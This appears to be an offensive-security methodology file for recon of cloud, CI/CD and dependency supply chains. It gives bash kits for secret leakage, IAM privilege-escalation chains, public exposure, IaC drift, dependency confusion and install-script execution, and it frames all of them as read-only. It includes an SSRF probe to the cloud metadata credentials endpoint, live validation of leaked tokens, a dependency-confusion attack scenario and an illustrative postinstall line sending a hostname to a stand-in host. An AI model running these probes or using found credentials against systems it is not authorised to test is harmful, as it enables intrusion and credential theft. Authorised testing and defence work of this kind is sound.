---
name: infra-vectors
description: Vector pack for sweeping the dev/ops seam -- IAM, secrets, IaC drift, CI/CD, containers, K8s, and dependency supply-chain. The 10 build-time-vs-run-time vectors that abstract the /upshift off-chain seam to cloud infrastructure.
---

# INFRA / CLOUD / SUPPLY-CHAIN VECTOR PACK

## Intro: the two disciplines and the seam

The two disciplines are **dev (app-sec)** and **ops (infra/platform/SRE)**. The seam is everywhere a *build-time* fact crosses into a *run-time* fact and the translation is owned by neither team: the CI secret that becomes a baked image layer, the IAM policy whose *intended* grant is narrower than its *effective* (transitive) grant, the Terraform that *declared* a private subnet but *deployed* a public one after a console hotfix, the `package.json` range that *resolved* to a different artifact than the lockfile pinned, the workflow that *trusts* a PR's code at the same privilege as `main`. Each side is audited in isolation. App-sec pen-tests the application; the cloud team runs CIS benchmarks on the account. The bug lives in the handoff: the artifact, the role-assumption chain, the runner's token, the registry resolution order.

**Candidate-target profile:** any org with a cloud footprint (AWS/GCP/Azure), a CI/CD pipeline (GitHub Actions, GitLab CI, CircleCI, Jenkins, Buildkite), container images shipped to a registry (ECR/GCR/GHCR/Docker Hub), Kubernetes for orchestration, IaC (Terraform/Pulumi/CloudFormation/CDK/Helm), and a dependency tree across more than one ecosystem (npm/PyPI/Go/Cargo/Maven). The higher-value the target, the more this is mature on *each* side and unowned at the seam. DeFi protocols, fintech, SaaS platforms, and infra vendors all fit -- the on-chain or product layer is audited to death; the deploy pipeline that *puts it there* is not.

**The shared blind spot:** devs assume "the secret only ever lives in CI, it's masked in logs, it's fine." Ops assume "the app validated its inputs and won't SSRF the metadata endpoint." Neither owns the *artifact* that carries the CI secret to a place an attacker can read it (an image layer, a sourcemap, a built `.env`, a pipeline log with masking bypassed), nor the *transitive* IAM chain where `iam:PassRole` + `lambda:CreateFunction` quietly equals `AdministratorAccess`. The exact analogue of upshift's "contracts audited to death, backend treated as a normal web project": here it is "cloud account CIS-benchmarked to death, the build pipeline treated as a normal internal dev tool."

**READ-ONLY ENUMERATION IS LAW.** Every kit below is read-only. Never `create`, `put`, `delete`, `assume` into a write action, `apply`, or `push` against a target you do not own. Recon mutates *nothing*. Where a kit *could* mutate (e.g. assume-role), it stops at proving the *grant exists* (policy simulation, `--dry-run`, `get-*`/`describe-*`/`list-*`), never the action. Proof of a misconfiguration is a `describe` output, not an exploited state change. If you must demonstrate exploitability, do it in your *own* account with the same policy shape, and present that as a controlled reproduction.

---

## Variables used across kits

```bash
# ---- Target identity / repos ----
export ORG="acme"                                  # GitHub/GitLab org or company slug
export REPO="acme/platform"                         # primary repo (owner/name)
export REPO_DIR="$HOME/recon/$ORG/platform"         # local clone path
export DOMAIN="acme.com"                            # primary apex domain
export REGISTRY="ghcr.io/acme"                      # container registry namespace
export IMAGE="ghcr.io/acme/api:latest"             # a representative shipped image

# ---- Cloud (read-only credentials YOU were given / your own test acct) ----
export AWS_PROFILE="acme-ro"                        # a read-only profile, NEVER write creds
export AWS_REGION="us-east-1"
export GCP_PROJECT="acme-prod"
export AZ_SUB="00000000-0000-0000-0000-000000000000"

# ---- Output dir ----
export OUT="$HOME/recon/$ORG/out"; mkdir -p "$OUT"

# ---- Wordlists / endpoints ----
export METADATA_V2="http://169.254.169.254/latest/api/token"        # IMDSv2 token endpoint (test FROM a workload you control)
export GCP_META="http://metadata.google.internal/computeMetadata/v1/"
export AZ_META="http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# ---- Tool presence sanity (install if missing) ----
# trufflehog gitleaks checkov tfsec prowler scoutsuite kube-bench kubectl
# syft grype trivy syft cosign jq httpx subfinder dnsx nuclei
for t in jq curl git trufflehog gitleaks trivy syft grype checkov tfsec; do
  command -v "$t" >/dev/null 2>&1 || echo "MISSING: $t"
done
```

---

## V1 -- Build→run secret leakage (CI logs, image layers, bundles, env, artifacts)

**What it is.** A secret minted for *build-time* use (a registry token, a deploy key, a cloud access key, an npm token, a signing key) escapes into a *run-time-readable* artifact: a baked Docker layer, a published sourcemap, a built front-end bundle, an env var injected into the running container's `/proc/1/environ`, a CI log where masking was defeated by base64/`echo`/multiline, or an uploaded build artifact (`.tfstate`, `.env`, `.npmrc`, `kubeconfig`). The seam: the dev who set `ARG NPM_TOKEN` in CI assumes it's gone after build; the ops side assumes the image is "just the app." Nobody owns the squashed-but-not-really layer history. This is the single most recurrent infra-seam bug because every pipeline mints short-lived-by-intent secrets that turn long-lived-by-artifact.

**Detection kit.**
```bash
# 1) Full-history secret scan of the repo (verified mode = fewer false positives, proves liveness)
git clone --mirror "https://github.com/$REPO.git" "$REPO_DIR.git"
trufflehog git "file://$REPO_DIR.git" --only-verified --json > "$OUT/th-repo.json"
gitleaks detect --source "$REPO_DIR.git" --report-path "$OUT/gitleaks-repo.json" --redact

# 2) Image-layer secret scan -- the killer. Secrets survive in lower layers even if rm'd later.
trivy image --scanners secret --format json "$IMAGE" > "$OUT/trivy-secret.json"
syft "$IMAGE" -o json > "$OUT/sbom.json"            # what shipped
# Enumerate layers and grep each -- secrets removed in layer N still live in layer N-1
mkdir -p "$OUT/img" && cd "$OUT/img"
docker save "$IMAGE" -o image.tar && mkdir -p extract && tar -xf image.tar -C extract
find extract -name '*.tar' -exec tar -xf {} -C extract \; 2>/dev/null
grep -rEa 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|xox[baprs]-|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{20,}\.' extract 2>/dev/null | head -50
trufflehog docker --image "$IMAGE" --only-verified --json > "$OUT/th-image.json"

# 3) Built front-end bundle + sourcemaps (run-time-public artifacts)
mkdir -p "$OUT/js" && httpx -silent -u "https://$DOMAIN" -ip 2>/dev/null
# grab JS, look for inlined secrets and .map references
curl -s "https://$DOMAIN" | grep -oE 'src="[^"]+\.js"' | sed 's/src="//;s/"//' | while read -r f; do
  curl -s "https://$DOMAIN/$f" -o "$OUT/js/$(basename "$f")"
done
trufflehog filesystem "$OUT/js" --only-verified --json > "$OUT/th-bundle.json"
grep -rEo 'sourceMappingURL=[^ ]+\.map' "$OUT/js"   # .map often exposes server-side config

# 4) CI logs (where you have access) -- masking-bypass patterns
gh run list -R "$REPO" --limit 30 --json databaseId -q '.[].databaseId' | while read -r id; do
  gh run view "$id" -R "$REPO" --log 2>/dev/null
done | grep -iE 'base64|echo \$\{?[A-Z_]*(TOKEN|KEY|SECRET|PASS)|::add-mask::' > "$OUT/ci-mask-bypass.txt"

# 5) Public artifacts / state files
trivy fs --scanners secret . 2>/dev/null      # local checkout incl. accidental .env, .tfstate
```

**Observed-state / readback step.** A hit is PROVEN, not plausible, only when the credential is *verified live against its issuer* -- and proof is the read-only validation call, never a privileged action. For an AWS key: `aws sts get-caller-identity` returns an ARN (proves the key authenticates and *whose* it is) -- stop there, do not enumerate further with it. For a GitHub PAT: `curl -s -H "Authorization: token $TOK" https://api.github.com/user | jq .login` returns the account. For an npm token: `npm whoami --registry https://registry.npmjs.org` returns the publisher. **Live** = the readback returns an identity; **patched** = `403/401/InvalidClientTokenId`. trufflehog `--only-verified` already does this issuer round-trip for many credential types and stamps `"Verified": true`. The state delta is `secret in run-time-readable artifact AND authenticates as identity X` vs the patched state `secret rotated → authentication fails`.

**Instance example (illustrative).** A shipped `api:latest` image sets `ARG NPM_TOKEN` in an early build stage to install a private package, then `RUN rm ~/.npmrc` in a later stage. The squash never happened; layer 3's `.npmrc` still carries `//registry.npmjs.org/:_authToken=npm_...`. `trufflehog docker --image` flags it `Verified:true`, `npm whoami` returns the org's publisher account. That token can publish the org's private packages -- a supply-chain pivot (chains into V5/V6).

**Generalization.** Beyond the regexes: hunt *intent-vs-residue* everywhere a secret is "used then discarded." Highest-value variants: (a) Terraform state in a public/over-read bucket (state stores *all* resource attributes including DB passwords and generated keys in plaintext); (b) CI cache artifacts (GitHub Actions cache, S3 build cache) containing `~/.aws/credentials` or kubeconfig; (c) container env at runtime readable via SSRF or a debug endpoint (`/actuator/env`, `/debug/vars`); (d) `.git/config` or `.npmrc`/`.netrc`/`.dockercfg` shipped inside the image; (e) build-arg secrets visible in `docker history --no-trunc`. Always check `docker history --no-trunc "$IMAGE"` -- build-time `ARG`s and `ENV`s are right there.

---

## V2 -- IAM privilege-escalation chains (PassRole / AssumeRole / wildcard)

**What it is.** The *intended* permission an identity has is narrower than its *effective* permission once you follow the transitive grant chain. The classic shape: a role that can `iam:PassRole` to an admin role plus `lambda:CreateFunction`/`ec2:RunInstances`/`glue:CreateJob` = it can run code *as* admin. Or `iam:CreatePolicyVersion` / `iam:AttachUserPolicy` / `iam:PutUserPolicy` on itself = it can grant itself anything. Or `sts:AssumeRole` with a too-broad trust policy. The seam: the dev who requested "let my Lambda read this one bucket" got a role; the ops engineer who later granted that same role `PassRole` for an unrelated deploy convenience never re-examined the *combination*. Privesc is emergent across grants nobody reviewed together.

**Detection kit.**
```bash
# Read-only IAM enumeration + automated privesc-path analysis
# (a) Full account posture -- prowler tags privesc-relevant checks
prowler aws -p "$AWS_PROFILE" -M json-ocsf json csv -o "$OUT/prowler" \
  --check iam_role_administratoraccess_policy_permissive_trust_relationship \
          iam_policy_allows_privilege_escalation \
          iam_inline_policy_allows_privilege_escalation_actions

# (b) Dump all policies for offline graph analysis (read-only)
aws iam get-account-authorization-details --profile "$AWS_PROFILE" \
  > "$OUT/iam-authz-details.json"

# (c) Pacu's enumerate (READ-ONLY modules only) OR cloudsplaining for static privesc paths
pip install cloudsplaining 2>/dev/null
cloudsplaining download --profile "$AWS_PROFILE" --output "$OUT/cs-account.json"
cloudsplaining scan --input-file "$OUT/cs-account.json" --output "$OUT/cloudsplaining"

# (d) Prove a specific path WITHOUT exercising it -- IAM policy simulator is read-only
# Does role X effectively have iam:PassRole + lambda:CreateFunction?
ROLE_ARN="arn:aws:iam::111122223333:role/app-ci-role"
aws iam simulate-principal-policy --profile "$AWS_PROFILE" \
  --policy-source-arn "$ROLE_ARN" \
  --action-names iam:PassRole lambda:CreateFunction lambda:InvokeFunction \
  --query 'EvaluationResults[].{Action:EvalActionName,Decision:EvalDecision}' --output table

# (e) GCP: who can actAs a service account + setIamPolicy (privesc primitives)
gcloud projects get-iam-policy "$GCP_PROJECT" --format=json > "$OUT/gcp-iam.json"
jq -r '.bindings[] | select(.role|test("iam.serviceAccountUser|iam.serviceAccountTokenCreator|owner|editor|setIamPolicy")) | "\(.role): \(.members|join(","))"' "$OUT/gcp-iam.json"

# (f) Azure: role assignments + custom roles with Microsoft.Authorization/*/write
az role assignment list --subscription "$AZ_SUB" --all -o json > "$OUT/az-roles.json"
jq -r '.[] | select(.roleDefinitionName|test("Owner|User Access Administrator|Contributor")) | "\(.principalName): \(.roleDefinitionName) @ \(.scope)"' "$OUT/az-roles.json"
```

**Observed-state / readback step.** Proof = the policy *simulator* returns `allowed` for the privesc action set, plus the *target* of the escalation exists. `simulate-principal-policy` is a pure read; an output of `EvalDecision: allowed` for `iam:PassRole` + `lambda:CreateFunction` against a `PassRole` target role that itself has `AdministratorAccess` is the observed state delta. **Live** = simulator says `allowed` AND `aws iam get-role --role-name <passable-admin-role>` returns a role whose attached policy is `AdministratorAccess`. **Patched** = simulator says `implicitDeny`/`explicitDeny`, or the passable role no longer has admin. Do not actually `CreateFunction`. The grant + the target is the finding; the chain is mechanical and uncontestable from `get-*` outputs.

**Instance example (illustrative).** `app-ci-role` is used by the deploy pipeline. Its policy allows `lambda:*` and `iam:PassRole` on `arn:aws:iam::*:role/*` (wildcard resource). Among the passable roles is `ops-break-glass` with `AdministratorAccess`. `simulate-principal-policy` returns `allowed` for `iam:PassRole`+`lambda:CreateFunction`+`lambda:InvokeFunction`. Effective permission of `app-ci-role` = `AdministratorAccess` via "create a Lambda that runs as ops-break-glass." Intended permission = "deploy our lambdas." That gap is the finding; it is provable entirely from read-only `get-account-authorization-details`.

**Generalization.** cloudsplaining/Pacu enumerate the well-known ~20 AWS privesc primitives (PutUserPolicy, AttachUserPolicy, CreatePolicyVersion, PassRole+RunInstances/CreateFunction/CreateJob/PassToDataPipeline, UpdateAssumeRolePolicy, sts:AssumeRole on permissive trust, etc.). Highest-value variants live where two services bridge: (a) a CI OIDC trust policy with a too-broad `sub` condition (`repo:acme/*:*` instead of `repo:acme/platform:ref:refs/heads/main`) -- any repo/branch in the org can assume the deploy role (chains hard with V9); (b) SSM `SendCommand` to an instance whose profile is admin; (c) `secretsmanager:GetSecretValue` + a secret holding *another* identity's static key; (d) cross-account `AssumeRole` with `Principal: "*"` and no external-id. On GCP the killer is `iam.serviceAccountTokenCreator` (mint tokens for any SA you can name); on Azure it's `User Access Administrator` (grant yourself anything).

---

## V3 -- Public exposure of internal services (misrouted LB, public bucket/subnet, SSRF→IMDS)

**What it is.** A service the dev side designed as *internal-only* becomes reachable from the *public edge*: a load balancer/ingress wired to a private target group but with a `0.0.0.0/0` listener, an S3/GCS bucket flipped public, a subnet that's "private" in the diagram but has an internet gateway route, an admin API on a path the WAF doesn't cover, or an app SSRF that reaches the cloud metadata endpoint (IMDS) and harvests instance-role credentials. The seam: ops "put it behind the VPC," dev "didn't validate the URL the app fetches." Reachability is a property of the *composition* of routing + app behavior that neither side models end to end.

**Detection kit.**
```bash
# (a) Public-exposure posture via Prowler / ScoutSuite (read-only)
prowler aws -p "$AWS_PROFILE" -M json -o "$OUT/prowler-exposure" \
  --check ec2_securitygroup_allow_ingress_from_internet_to_any_port \
          s3_bucket_public_access \
          elbv2_internet_facing \
          rds_instance_no_public_access
scout aws --profile "$AWS_PROFILE" --report-dir "$OUT/scoutsuite" --no-browser

# (b) External attack-surface map of the org's edge
subfinder -d "$DOMAIN" -all -silent | dnsx -silent -a -resp \
  | tee "$OUT/subs.txt" | httpx -silent -title -status-code -tech-detect -ip \
  > "$OUT/edge.txt"
# Flag internal-y names that resolve publicly
grep -iE 'internal|admin|staging|dev|jenkins|grafana|kibana|consul|vault|argocd|kube|metrics|debug|prometheus' "$OUT/edge.txt"

# (c) Find dangling / orphaned DNS (subdomain takeover) and exposed dashboards
nuclei -l "$OUT/subs.txt" -t http/takeovers/ -t http/exposed-panels/ -t http/misconfiguration/ \
  -severity medium,high,critical -o "$OUT/nuclei-exposure.txt"

# (d) Public object stores
# AWS:
aws s3api list-buckets --profile "$AWS_PROFILE" --query 'Buckets[].Name' --output text | tr '\t' '\n' \
  | while read -r b; do
      pab=$(aws s3api get-public-access-block --bucket "$b" --profile "$AWS_PROFILE" 2>/dev/null)
      acl=$(aws s3api get-bucket-acl --bucket "$b" --profile "$AWS_PROFILE" 2>/dev/null | jq -r '.Grants[]|select(.Grantee.URI? and (.Grantee.URI|test("AllUsers")))|.Permission' 2>/dev/null)
      [ -n "$acl" ] && echo "PUBLIC-ACL: $b -> $acl"
    done
# GCP:
gsutil ls -p "$GCP_PROJECT" 2>/dev/null | while read -r b; do
  gsutil iam get "$b" 2>/dev/null | jq -r --arg b "$b" '.bindings[]?|select(.members[]?|test("allUsers|allAuthenticatedUsers"))|"PUBLIC: \($b) \(.role)"'
done

# (e) SSRF→IMDS reachability -- TEST FROM A WORKLOAD YOU CONTROL or via the app's own fetch param.
# IMDSv2 requires a PUT token first; IMDSv1 (no token) reachable = stronger finding.
# Probe whether the app proxies a URL you supply (read-only against the metadata READ path):
curl -s "https://$DOMAIN/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | head
# If IMDSv1 enabled, the role name comes back; appending it yields temp creds (do NOT exfil beyond proving readback).
```

**Observed-state / readback step.** Exposure is PROVEN when the *external* probe returns service content that the architecture says should be internal. For a misrouted LB: `httpx` returns `200` + the internal admin title from an internet-facing IP. For a public bucket: `aws s3api get-bucket-acl` shows `AllUsers: READ` AND `curl -s https://$b.s3.amazonaws.com/` lists keys (or returns an object) without credentials. For SSRF→IMDS: the app's fetch returns the `iam/security-credentials/<role>` JSON containing `AccessKeyId`/`Token` -- proof is that the metadata *read* succeeds through the app boundary; stop at showing the role name + that creds are returned, do not use them. **Live** = unauthenticated external read returns internal data. **Patched** = `403`/timeout/IMDSv2-enforced (`PUT` token required, IMDSv1 disabled → metadata read returns `401`).

**Instance example (illustrative).** `argocd.acme.com` resolves to a public ALB. The dev team assumed Argo CD was VPC-internal; the ALB listener was left `0.0.0.0/0` from an earlier debug session never reverted (IaC drift, chains with V4). `httpx` returns `200 Argo CD`. The Argo CD API, if it has anonymous read or a default cred, exposes the full cluster app inventory and sync state. Even read-only, that's a cluster-topology disclosure and a pivot toward V8.

**Generalization.** Beyond named checks: the highest-value exposures are (a) IMDSv1 still enabled on workloads behind an app that fetches user URLs (SSRF→role creds, the Capital One pattern); (b) Kubernetes API server / kubelet read ports (`10250`) public; (c) etcd/Consul/Vault unauthenticated; (d) Elasticsearch/Mongo/Redis with no auth on a public IP; (e) cloud SQL/RDS with `PubliclyAccessible:true`; (f) a CDN/WAF that's bypassable by hitting the origin IP directly (find origin via cert transparency + historical DNS). For metadata SSRF, test all three providers' endpoints -- GCP needs the `Metadata-Flavor: Google` header (so a header-stripping proxy may block it; an SSRF that controls headers does not).

---

## V4 -- IaC drift (declared vs deployed)

**What it is.** What Terraform/Pulumi/CloudFormation/CDK/Helm *declares* in the repo is not what is *deployed* in the account. Someone hotfixed a security group in the console, an `apply` failed halfway, a resource was created out-of-band, or state and reality diverged. The repo audit (checkov/tfsec on the `.tf`) says "secure" because the *declaration* is secure; the account is insecure because the *deployment* drifted. The seam: app-sec/code-review audits the IaC source; the cloud posture team audits the live account; the *delta* between them is owned by no one and is precisely where the dangerous config hides (the secure-looking PR that was never the thing actually running).

**Detection kit.**
```bash
# (a) Static scan of the declared IaC (establishes the "declared" baseline)
checkov -d "$REPO_DIR" --compact -o json > "$OUT/checkov.json"
tfsec "$REPO_DIR" --format json --out "$OUT/tfsec.json"
trivy config "$REPO_DIR" --format json -o "$OUT/trivy-config.json"   # tf/cfn/helm/dockerfile/k8s

# (b) Compute drift WITHOUT mutating -- terraform plan is read-only against state.
# Use a READ-ONLY backend creds; -refresh-only never proposes changes to resources.
cd "$REPO_DIR/terraform"
terraform init -input=false -backend-config="..."          # read-only state access
terraform plan -refresh-only -lock=false -detailed-exitcode -out="$OUT/drift.plan" 2>&1 | tee "$OUT/drift.txt"
# exit 0 = no drift, exit 2 = drift detected (the finding signal)
terraform show -json "$OUT/drift.plan" | jq '.resource_drift' > "$OUT/resource-drift.json"

# (c) driftctl: declared-in-state vs actually-in-cloud (catches OUT-OF-BAND resources)
driftctl scan --from tfstate+s3://acme-tfstate/prod.tfstate \
  --output json://"$OUT/driftctl.json" 2>/dev/null
jq -r '.unmanaged[]? | "UNMANAGED: \(.type) \(.id)"' "$OUT/driftctl.json"   # exists in cloud, not in code

# (d) Cross-check: live posture (Prowler) vs declared posture (checkov).
# A resource checkov says is "private" but Prowler flags "internet-facing" = drift finding.
jq -r '.results.failed_checks[]?|.resource' "$OUT/checkov.json" | sort -u > "$OUT/declared-fail.txt"
jq -r '.[]?|select(.status_extended|test("public|internet"))|.resource_uid' "$OUT/prowler-exposure/"*.json 2>/dev/null | sort -u > "$OUT/live-public.txt"
comm -13 "$OUT/declared-fail.txt" "$OUT/live-public.txt"   # public live but NOT a declared failure = silent drift
```

**Observed-state / readback step.** The proof is the *diff itself*, sourced from two independent reads. `terraform plan -refresh-only -detailed-exitcode` returning exit code `2` is a machine-verified statement "state ≠ reality." `driftctl`'s `unmanaged` list is "resources in the cloud that the code does not know about." The strongest readback: declared resource X has `ingress = [10.0.0.0/8]` in the `.tf` (grep proves it) AND `aws ec2 describe-security-groups --group-ids <id>` shows `0.0.0.0/0` in the live rule. **Live/vulnerable** = `describe-*` returns the permissive live config while the repo declares the restrictive one. **Patched** = they match, or the drift is on a benign attribute. This vector turns "the PR looked secure" into "the deployed thing is not the PR," which is uncontestable because both sides are read outputs.

**Instance example (illustrative).** The repo's `sg_api.tf` declares ingress from the ALB SG only. Someone debugging a prod incident added `0.0.0.0/0:22` via console and never reverted. checkov on the repo passes (declaration is clean). `terraform plan -refresh-only` flags the SG as drifted; `describe-security-groups` shows the live `0.0.0.0/0:22`. SSH is open to the world on a prod box whose instance profile (chain to V2) has S3 + SSM. The clean-PR audit completely missed it.

**Generalization.** Drift hides in: (a) security-group/firewall rules added out-of-band; (b) IAM policies edited in console after the role was Terraformed; (c) resources created entirely outside IaC (driftctl `unmanaged`) -- often the riskiest because *nothing* governs them; (d) S3 public-access-block toggled off live; (e) KMS key policies widened; (f) RDS `publicly_accessible` flipped. Also audit *Helm/K8s* drift: `helm get values` vs the chart in repo, and `kubectl get -o yaml` vs the manifest. The highest-value finding is an *unmanaged* resource with a dangerous config, because it will never be caught by any code review on any cadence.

---

## V5 -- Dependency confusion / typosquat / lockfile-vs-manifest drift

**What it is.** The package the build *resolves* differs from the package the developer *intended*. Three shapes: (1) **dependency confusion** -- an internal package name (`@acme/secret-utils`) is also claimable on the public registry; if the resolver checks public first or by version-precedence, an attacker's public `@acme/secret-utils@99.0.0` ships into the build; (2) **typosquat** -- a near-miss name (`reqeusts`, `colourama`) pulls attacker code; (3) **lockfile drift** -- the `package.json`/`requirements.txt` range allows a version the `package-lock.json`/`poetry.lock` doesn't pin, or the lockfile points at a different registry/integrity than the manifest implies. The seam: dev declares dependencies; ops/CI runs `npm install` with whatever registry config the runner has. Resolution order is owned by neither.

**Detection kit.**
```bash
cd "$REPO_DIR"
# (a) Enumerate internal-looking deps and check public-registry claimability (confusion)
# npm: list scoped + bare deps, then probe the PUBLIC registry for existence.
jq -r '.dependencies, .devDependencies | keys[]?' package.json 2>/dev/null | sort -u > "$OUT/deps-npm.txt"
while read -r pkg; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://registry.npmjs.org/$pkg")
  echo "$code $pkg"
done < "$OUT/deps-npm.txt" | tee "$OUT/npm-public-status.txt"
# 404 on PUBLIC for a package you USE = candidate for dependency-confusion (name is unclaimed publicly)
grep '^404 ' "$OUT/npm-public-status.txt"

# (b) Is there a private scope without a registry pin? (the confusion enabler)
grep -RInE '@[a-z0-9-]+/' package.json
cat .npmrc 2>/dev/null    # is @acme: pinned to the internal registry? If not, public wins for some configs.
# Python:
pip download --no-deps -d /tmp/x -r requirements.txt 2>&1 | grep -iE 'from https://pypi.org' # which come from public PyPI

# (c) Typosquat distance check against known-popular names (Levenshtein ~1)
# OSV + Socket-style scan via osv-scanner & trivy:
osv-scanner --lockfile package-lock.json --format json > "$OUT/osv.json" 2>/dev/null
trivy fs --scanners vuln --format json -o "$OUT/trivy-deps.json" .

# (d) Lockfile-vs-manifest integrity drift
# npm: confirm every resolved tarball has an integrity hash and resolves to the expected registry
jq -r '.. | objects | select(.resolved? and .integrity?) | "\(.resolved) \(.integrity)"' package-lock.json 2>/dev/null \
  | grep -vE 'registry.npmjs.org|registry.yarnpkg.com|'"$ORG" | head     # off-registry resolution = red flag
# Go: verify module sums match the public checksum DB
( cd "$REPO_DIR" && GOFLAGS=-mod=mod GONOSUMCHECK=0 go mod verify ) 2>&1 | tee "$OUT/gomodverify.txt"

# (e) SBOM the SHIPPED image and diff against the declared manifest (build-time vs run-time deps)
syft "$IMAGE" -o cyclonedx-json > "$OUT/sbom-image.json"
# anything in the running image NOT declared in the repo manifest = injected/transitive surprise
```

**Observed-state / readback step.** Proof for confusion: the internal name returns `404` on the *public* registry (`curl` status) AND the build config does not pin the scope to the private registry (grep of `.npmrc`/`pip.conf`/`.netrc` shows no `@acme:registry=` or a public `index-url`). The observed delta: "an attacker can publish `name@<higher-version>` publicly and the next CI `npm install` resolves to it." **Do not publish anything to the public registry to demonstrate it** -- that is mutation and is hostile. Prove the *pre-condition* (unclaimed public name + unpinned resolver) which is the entire finding. For lockfile drift: proof is the `package-lock.json` entry whose `resolved` URL points off the expected registry, or whose `integrity` is absent. For Go: `go mod verify` printing `mismatch` is the readback. **Live** = unclaimed-public + unpinned. **Patched** = scope pinned to private registry, or the public name is owned by the org (defensive registration), or lockfile integrity is intact and on-registry.

**Impact line (don't ship a bare misconfig).** The confirmed precondition is not the impact -- chain it to state the impact at Phase 0: a resolved confusion package runs its install/build script (V6) on the CI runner, which holds the deploy identity (V9 OIDC / V2 IAM role). So the honest impact is *arbitrary code execution as the deploy principal on every CI run until the name is claimed defensively*, i.e. full pipeline-to-prod compromise. Quantify it: `impact = code-exec as <deploy role/principal>, blast radius = <what that principal can reach: prod deploy, secrets, cloud account>`. A confusion finding without that downstream-identity line reads as theoretical and gets triaged as Low; with it, it is the build-supply-chain killshot.

**Instance example (illustrative).** `package.json` depends on `@acme/feature-flags` (an internal package). `.npmrc` in the repo pins `@acme:registry=https://npm.acme.internal/`, *but* the GitHub Actions runner's `.npmrc` (set in the workflow, not the repo) only sets the public registry and `always-auth=false`. The public registry returns `404` for `@acme/feature-flags`. Resolution falls back to public for that scope in the CI context. An attacker registers `@acme/feature-flags@9.9.9` publicly; the next build installs it and runs its `postinstall` (chain to V6) on the CI runner with deploy creds. The finding is provable from the `404` + the *workflow* `.npmrc` mismatch, with zero publishing.

**Generalization.** Highest-value variants: (a) confusion against *build tooling* (a custom internal `eslint-config-acme`, a private GitHub Action referenced by mutable tag); (b) Python `--extra-index-url` (PyPI is searched alongside the private index, higher version wins -- the original confusion vector); (c) a private Go module whose path is `github.com/acme/...` but proxied through a public GOPROXY without `GOPRIVATE` set; (d) container base-image confusion (`FROM acme/base` resolving to Docker Hub `acme/base` instead of the private registry); (e) GitHub Action pinned by `@v1` tag (mutable) instead of full commit SHA. Cross-reference `~/arsenal/methodology/MULTI-LANG-PATTERNS.md` for per-ecosystem resolver quirks.

---

## V6 -- Post-install / build-script execution (arbitrary code at install/build time)

**What it is.** Package managers and build systems run *arbitrary code* during dependency installation or build: npm `preinstall`/`install`/`postinstall`, Python `setup.py`/PEP-517 build backends, Cargo `build.rs`, Gradle/Maven plugins, Go `//go:generate`, Makefile `make`. Combined with V5 (you control what gets installed) or a compromised transitive dep, this is RCE on the build runner -- which holds the deploy creds. The seam: dev "added a dependency"; ops "the CI runner is ephemeral and locked down" -- but the runner has the cloud OIDC token / registry push creds during the build, and the install script runs *before* any app-level sandbox. Build-time code execution is owned by no security model on either side.

**Detection kit.**
```bash
cd "$REPO_DIR"
# (a) Inventory every install/build hook that WILL execute (your own + transitive)
# npm: list packages declaring lifecycle scripts (these run on install)
find node_modules -name package.json -maxdepth 2 2>/dev/null -exec sh -c '
  jq -e ".scripts | (.preinstall? // .install? // .postinstall?)" "$1" >/dev/null 2>&1 && echo "$1"
' _ {} \; > "$OUT/npm-lifecycle-pkgs.txt"
# Safer: dry-run install with scripts DISABLED, then list what WOULD have run
npm install --ignore-scripts --package-lock-only 2>/dev/null
npm query ":root > *" 2>/dev/null | jq -r '.[]|select(.scripts and (.scripts.install or .scripts.postinstall or .scripts.preinstall))|.name' 2>/dev/null

# (b) Python build-backend / setup.py inspection (do NOT run setup.py)
grep -RInE 'os\.system|subprocess|exec\(|eval\(|__import__|urllib|requests\.(get|post)|socket' \
  $(find . -name 'setup.py' -o -name 'conftest.py') 2>/dev/null | head
grep -RIn 'build-backend' $(find . -name pyproject.toml) 2>/dev/null

# (c) Rust build scripts / Go generate / Makefiles
grep -RIl 'build.rs' . ; grep -RInE 'std::process::Command|reqwest|ureq' $(find . -name build.rs) 2>/dev/null
grep -RInE '//go:generate' . 2>/dev/null
grep -RInE '\$\(shell |curl |wget |bash <\(|eval ' Makefile makefile GNUmakefile 2>/dev/null

# (d) Diff lifecycle scripts of a SUSPECT dep version vs a prior clean version
npm pack "suspect-pkg@latest" --dry-run 2>/dev/null
diff <(curl -s "https://registry.npmjs.org/suspect-pkg" | jq -r '.versions["1.0.0"].scripts') \
     <(curl -s "https://registry.npmjs.org/suspect-pkg" | jq -r '.versions["1.0.1"].scripts')

# (e) Network behaviour of an install in a SANDBOX you own (egress monitoring)
# Run in a throwaway container with no creds, capture outbound connections:
docker run --rm -it --network=bridge -v "$PWD":/src node:20 sh -c \
  'cd /src && (timeout 60 npm ci 2>&1 &) ; ss -tnp 2>/dev/null' 2>&1 | grep -vE '127.0.0.1|::1' | head
```

**Observed-state / readback step.** Proof = a lifecycle/build script that (a) exists and will run on install/build, and (b) performs an action beyond compiling -- network egress, reading env/creds, writing outside the package dir. The strongest readback: in a *credential-free sandbox you own*, an `npm ci` triggers an outbound connection from a `postinstall` to an attacker-controlled-looking host (`ss -tnp` shows the connection), or reads `process.env` / `~/.aws`. **Live** = the script runs and exhibits exfil/exec behavior. **Patched/benign** = `--ignore-scripts` is enforced in CI (`.npmrc` has `ignore-scripts=true`), or the scripts are pure compilation with no network/env access. The observed state is the captured egress or the env-read syscall, never a claimed "could." Critically: demonstrate in *your own* sandbox; never let a suspicious install run against a runner with real creds.

**Instance example (illustrative).** A transitive dependency `@somelib/native-helper` ships a `postinstall` that `curl`s `https://hits.somelib-cdn.test/r?h=$(hostname)` "for telemetry." In the org's CI, `ignore-scripts` is not set, so this runs on a runner that holds a GitHub OIDC token federated to `app-ci-role` (chain to V2). The same `postinstall` could read `$AWS_WEB_IDENTITY_TOKEN_FILE`. Sandbox readback: `ss -tnp` shows the outbound connection; the script source shows the env access. Finding: build-runner RCE primitive, gated only on the dependency being (or becoming) malicious -- which V5 makes attacker-controllable.

